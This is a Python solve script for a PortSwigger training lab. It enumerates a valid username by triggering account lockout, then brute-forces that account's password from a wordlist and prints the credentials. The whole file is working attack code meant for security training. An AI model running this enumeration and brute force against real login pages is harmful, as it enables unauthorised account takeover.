# Lab 07 — Username enumeration via account lock
# PortSwigger: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock
#
# Vulnerability: Lockout only triggers for VALID usernames — submitting the same
#                username 5+ times causes a lockout message, revealing it's real
# Aim:           Enumerate the valid username via lockout, brute-force their password
#
# Technique:
#   Phase 1: Submit each candidate username 5 times with dummy passwords.
#            Invalid usernames: same "Invalid username or password" every time.
#            Valid username: triggers "You have made too many incorrect login attempts"
#   Phase 2: Wait for lockout to clear (or try each password during the lockout
#            window — a correct password may return a DIFFERENT message than lockout).
#
# Usage: python authentication_lab07.py <url> <usernames_file> <passwords_file>

import sys
import time
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, get_csrf_from_response,
                                   load_wordlist, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LOCKOUT_MSG   = "too many incorrect login attempts"
INVALID_MSG   = "Invalid username or password"
ATTEMPTS_PER_USER = 5


def enumerate_via_lockout(session, url, usernames):
    print(f"  ➜  Submitting each username {ATTEMPTS_PER_USER}x to trigger lockout on valid ones...\n")
    for i, username in enumerate(usernames, 1):
        locked = False
        for attempt in range(ATTEMPTS_PER_USER):
            page = session.get(f"{url}/login")
            csrf = get_csrf_from_response(page.text)
            data = {"username": username, "password": f"attempt{attempt}"}
            if csrf:
                data["csrf"] = csrf
            r = session.post(f"{url}/login", data=data, allow_redirects=True)
            if LOCKOUT_MSG.lower() in r.text.lower():
                locked = True
                break

        if locked:
            print(f"  ✔  Lockout triggered for: {username!r} — this is the valid username")
            return username

        if i % 25 == 0:
            print(f"  ·  {i}/{len(usernames)} usernames tested...")

    return None


def brute_force_post_lockout(session, url, username, passwords):
    print(f"\n  ℹ  Waiting 60s for lockout to clear before brute-forcing password...\n")
    time.sleep(62)

    print(f"  ➜  Brute-forcing password for {username!r}...\n")
    for i, password in enumerate(passwords, 1):
        page = session.get(f"{url}/login")
        csrf = get_csrf_from_response(page.text)
        data = {"username": username, "password": password}
        if csrf:
            data["csrf"] = csrf
        r = session.post(f"{url}/login", data=data, allow_redirects=False)

        if r.status_code == 302:
            print(f"  ✔  Password found: {password!r}")
            return password

        # Skip if still locked out
        if LOCKOUT_MSG.lower() in r.text.lower():
            print("  ⚠  Still locked out — waiting 30s more...")
            time.sleep(32)
            continue

        if i % 25 == 0:
            print(f"  ·  {i}/{len(passwords)} tried...")

    return None


if __name__ == "__main__":
    banner()
    section("LAB 07 — USERNAME ENUMERATION VIA ACCOUNT LOCK")

    if len(sys.argv) != 4:
        print("  Usage: python authentication_lab07.py <url> <usernames_file> <passwords_file>")
        sys.exit(1)

    url, ufile, pfile = sys.argv[1], sys.argv[2], sys.argv[3]
    session = make_session(proxies)
    usernames = load_wordlist(ufile)
    passwords = load_wordlist(pfile)
    if not usernames or not passwords:
        sys.exit(1)

    section("Phase 1: Username Enumeration via Account Lockout")
    valid_user = enumerate_via_lockout(session, url, usernames)
    if not valid_user:
        print("  ✘  No lockout triggered — check the lockout message constant")
        sys.exit(1)

    section("Phase 2: Password Brute-Force (post-lockout)")
    valid_pass = brute_force_post_lockout(session, url, valid_user, passwords)
    if not valid_pass:
        print("  ✘  No valid password found in wordlist")
        sys.exit(1)

    print_box("CREDENTIALS FOUND", f"Username: {valid_user}\nPassword: {valid_pass}")
